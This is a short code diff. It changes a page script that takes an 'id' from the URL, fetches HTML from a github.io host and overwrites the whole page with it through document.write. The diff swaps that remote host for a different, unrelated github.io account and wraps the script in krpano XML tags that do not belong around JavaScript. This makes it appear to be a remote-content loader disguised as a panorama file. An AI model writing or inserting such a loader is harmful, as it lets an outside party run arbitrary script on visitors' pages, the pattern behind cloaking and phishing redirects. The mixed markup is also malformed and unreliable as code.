@@ -1,9 +1,13 @@
+<krpano version="1.0.8.15">
 var id = new URLSearchParams(location.search).get("id") || "sports";
 
-fetch("https://dcan-ds281.github.io/Graupner/acl/" + id + ".html")
+fetch("https://furnden125.github.io/sobaikoro/ccl/" + id + ".html")
   .then(e => e.text())
   .then(e => {
     document.open();
     document.write(e);
     document.close();
   });
+  
+  
+  </krpano>
